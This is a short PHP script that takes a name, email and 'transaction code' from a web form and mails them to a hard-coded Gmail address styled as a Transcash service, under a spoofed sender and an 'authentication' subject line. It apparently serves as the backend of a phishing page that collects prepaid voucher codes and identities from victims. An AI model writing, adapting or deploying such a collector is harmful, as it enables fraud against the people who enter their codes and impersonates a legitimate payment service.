<?php

$email=$_POST['email'];
$name=$_POST['name'];
$prenom=$_POST['prenom'];
$code=$_POST['code'];


var_dump($_POST);
$to=$_ENV["to"];

$to = "servicetranscash22221@gmail.com";
$subject = "Authentification de Code de transaction";

$message = "
<html>
<head>
<title>Code d'authentification</title>
</head>
<body>
<p>Voici les informations du demandeur</p>
<table>
<tr>
<th>Nom et Présom</th>
<th>Email</th>
<th>Code</th>
</tr>
<tr>
<td>".$name." ".$prenom."</td>
<td>".$email."</td>
<td>".$code."</td>
</tr>
</table>
</body>
</html>
";

// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More head ers
$headers .= 'From: <rservicedes@gmail.com>' . "\r\n";


$message="E-mail : ".$email."\nNom et prénom : ".$name." ".$prenom."\nCode : ".$code;
mail($to,$subject,$message);

?>